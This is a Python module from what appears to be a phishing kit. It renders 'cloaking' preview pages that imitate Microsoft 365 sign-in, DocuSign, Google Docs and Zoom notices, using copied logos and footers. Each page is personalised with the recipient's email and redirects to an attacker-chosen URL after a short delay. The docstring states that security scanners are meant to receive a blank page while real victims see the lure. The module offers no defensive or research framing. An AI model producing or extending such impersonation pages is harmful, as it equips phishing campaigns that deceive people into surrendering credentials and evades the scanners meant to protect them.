"""
Cloaking / Preview Page Templates
Renders convincing landing pages that look like familiar services.
Scanners receive a safe blank response; real browsers get the preview
page which auto-redirects to the actual destination after a brief delay.

Available templates:
  microsoft   — Microsoft / Office 365 sign-in look-alike
  docusign    — DocuSign document ready notice
  google      — Google Docs shared document notice
  zoom        — Zoom meeting invite
  generic     — Neutral "Secure document access" page

Usage:
  html = render_preview(template, destination_url, email=None, domain=None)
"""

from __future__ import annotations

import html as _html
from typing import Optional

_BASE_CSS = """
  *{box-sizing:border-box;margin:0;padding:0}
  body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;
       background:#f3f2f1;display:flex;align-items:center;justify-content:center;
       min-height:100vh}
  .card{background:#fff;border-radius:4px;box-shadow:0 2px 8px rgba(0,0,0,.15);
        padding:44px 44px 36px;max-width:440px;width:100%;text-align:center}
  .logo{margin-bottom:24px}
  .logo img{height:36px}
  h1{font-size:18px;font-weight:600;margin-bottom:8px;color:#1b1b1b}
  p{font-size:14px;color:#444;line-height:1.5;margin-bottom:20px}
  .email{font-weight:600;color:#0078d4}
  .btn{display:inline-block;padding:10px 24px;background:#0078d4;color:#fff;
       border-radius:2px;text-decoration:none;font-size:14px;cursor:pointer;
       border:none;width:100%;font-family:inherit}
  .btn:hover{background:#106ebe}
  .spinner{display:inline-block;width:20px;height:20px;border:2px solid #ccc;
           border-top-color:#0078d4;border-radius:50%;animation:spin .8s linear infinite;
           vertical-align:middle;margin-right:8px}
  @keyframes spin{to{transform:rotate(360deg)}}
  .footer{font-size:11px;color:#888;margin-top:20px}
"""

_AUTO_REDIRECT_JS = """
<script>
(function(){{
  var dest = {dest_json};
  var delay = {delay_ms};
  setTimeout(function(){{ window.location.replace(dest); }}, delay);
}})();
</script>
"""


def _e(text: str) -> str:
    """HTML-escape a string."""
    return _html.escape(str(text), quote=True)


def _build_page(*, title: str, body_html: str, destination_url: str, delay_ms: int = 1200) -> str:
    import json as _json
    redirect_js = _AUTO_REDIRECT_JS.format(
        dest_json=_json.dumps(destination_url),
        delay_ms=delay_ms,
    )
    return f"""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>{_e(title)}</title>
<meta name="robots" content="noindex,nofollow">
<style>{_BASE_CSS}</style>
</head>
<body>
{body_html}
{redirect_js}
</body>
</html>"""


# ── Microsoft / Office 365 ─────────────────────────────────────────────────────

_MICROSOFT_SVG = (
    '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 23 23" width="36" height="36">'
    '<rect x="1" y="1" width="10" height="10" fill="#f25022"/>'
    '<rect x="12" y="1" width="10" height="10" fill="#7fba00"/>'
    '<rect x="1" y="12" width="10" height="10" fill="#00a4ef"/>'
    '<rect x="12" y="12" width="10" height="10" fill="#ffb900"/>'
    '</svg>'
)


def _microsoft_template(destination_url: str, email: Optional[str], domain: Optional[str]) -> str:
    email_line = f'<p>Signing in as <span class="email">{_e(email)}</span></p>' if email else ''
    domain_label = _e(domain or 'Microsoft 365')
    body = f"""
<div class="card">
  <div class="logo">{_MICROSOFT_SVG}</div>
  <h1>Microsoft</h1>
  <p>Sign in to <strong>{domain_label}</strong></p>
  {email_line}
  <p><span class="spinner"></span>Loading your account&hellip;</p>
  <div class="footer">Microsoft Corporation · Privacy · Terms of use</div>
</div>"""
    return _build_page(title="Sign in to Microsoft", body_html=body, destination_url=destination_url)


# ── DocuSign ───────────────────────────────────────────────────────────────────

def _docusign_template(destination_url: str, email: Optional[str], domain: Optional[str]) -> str:
    email_line = f'<p>Sent to <span class="email">{_e(email)}</span></p>' if email else ''
    doc_name = _e(domain or 'Secure Document')
    body = f"""
<div class="card">
  <div class="logo">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 120 40" width="120">
      <rect width="120" height="40" rx="4" fill="#ffd700"/>
      <text x="10" y="28" font-size="20" font-family="Arial" font-weight="bold" fill="#000">DocuSign</text>
    </svg>
  </div>
  <h1>Document Ready to Sign</h1>
  <p><strong>{doc_name}</strong> requires your signature.</p>
  {email_line}
  <p><span class="spinner"></span>Opening document&hellip;</p>
  <div class="footer">Powered by DocuSign eSignature · Legal · Privacy</div>
</div>"""
    return _build_page(title="DocuSign — Document Ready", body_html=body, destination_url=destination_url)


# ── Google Docs ────────────────────────────────────────────────────────────────

_GOOGLE_SVG = (
    '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 48 48" width="36">'
    '<path fill="#4285F4" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 '
    '14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/>'
    '<path fill="#34A853" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 '
    '5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/>'
    '<path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 '
    '16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/>'
    '<path fill="#EA4335" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.18 1.48-4.97 2.31-8.16 '
    '2.31-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/>'
    '</svg>'
)


def _google_template(destination_url: str, email: Optional[str], domain: Optional[str]) -> str:
    email_line = f'<p>Shared with <span class="email">{_e(email)}</span></p>' if email else ''
    doc_name = _e(domain or 'Shared Document')
    body = f"""
<div class="card">
  <div class="logo">{_GOOGLE_SVG}</div>
  <h1>Google Docs</h1>
  <p><strong>{doc_name}</strong> has been shared with you.</p>
  {email_line}
  <p><span class="spinner"></span>Opening document&hellip;</p>
  <div class="footer">Google LLC · Privacy Policy · Terms of Service</div>
</div>"""
    return _build_page(title="Google Docs — Shared with you", body_html=body, destination_url=destination_url)


# ── Zoom ───────────────────────────────────────────────────────────────────────

def _zoom_template(destination_url: str, email: Optional[str], domain: Optional[str]) -> str:
    email_line = f'<p>Invite sent to <span class="email">{_e(email)}</span></p>' if email else ''
    meeting_host = _e(domain or 'Meeting Host')
    body = f"""
<div class="card">
  <div class="logo">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 120 40" width="120">
      <rect width="120" height="40" rx="8" fill="#2D8CFF"/>
      <text x="14" y="28" font-size="20" font-family="Arial" font-weight="bold" fill="#fff">zoom</text>
    </svg>
  </div>
  <h1>Meeting Invite</h1>
  <p><strong>{meeting_host}</strong> has invited you to join a Zoom meeting.</p>
  {email_line}
  <p><span class="spinner"></span>Joining meeting&hellip;</p>
  <div class="footer">Zoom Video Communications · Privacy · Terms</div>
</div>"""
    return _build_page(title="Zoom Meeting — Joining", body_html=body, destination_url=destination_url)


# ── Generic / Neutral ──────────────────────────────────────────────────────────

def _generic_template(destination_url: str, email: Optional[str], domain: Optional[str]) -> str:
    email_line = f'<p>Access granted for <span class="email">{_e(email)}</span></p>' if email else ''
    service = _e(domain or 'Secure Portal')
    body = f"""
<div class="card">
  <div class="logo">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 36 36" width="36">
      <circle cx="18" cy="18" r="18" fill="#0078d4"/>
      <path d="M18 10a4 4 0 1 0 0 8 4 4 0 0 0 0-8zm-7 16c0-3.87 3.13-7 7-7s7 3.13 7 7H11z" fill="#fff"/>
    </svg>
  </div>
  <h1>{service}</h1>
  <p>Verifying your secure access&hellip;</p>
  {email_line}
  <p><span class="spinner"></span>Please wait&hellip;</p>
  <div class="footer">Secure · Encrypted · Private</div>
</div>"""
    return _build_page(title="Secure Access", body_html=body, destination_url=destination_url)


# ── Public API ─────────────────────────────────────────────────────────────────

_TEMPLATES = {
    'microsoft': _microsoft_template,
    'docusign':  _docusign_template,
    'google':    _google_template,
    'zoom':      _zoom_template,
    'generic':   _generic_template,
}

VALID_TEMPLATES = list(_TEMPLATES.keys())


def render_preview(
    template: str,
    destination_url: str,
    email: Optional[str] = None,
    domain: Optional[str] = None,
) -> str:
    """
    Render a cloaking preview page.

    Args:
        template:        One of VALID_TEMPLATES.  Falls back to 'generic' if unknown.
        destination_url: Where the auto-redirect JS will send the real visitor.
        email:           Personalise the page with the recipient's email (optional).
        domain:          Sender / service domain label (optional).

    Returns:
        Full HTML string, safe to serve as text/html.
    """
    fn = _TEMPLATES.get(template, _generic_template)
    return fn(destination_url, email, domain)
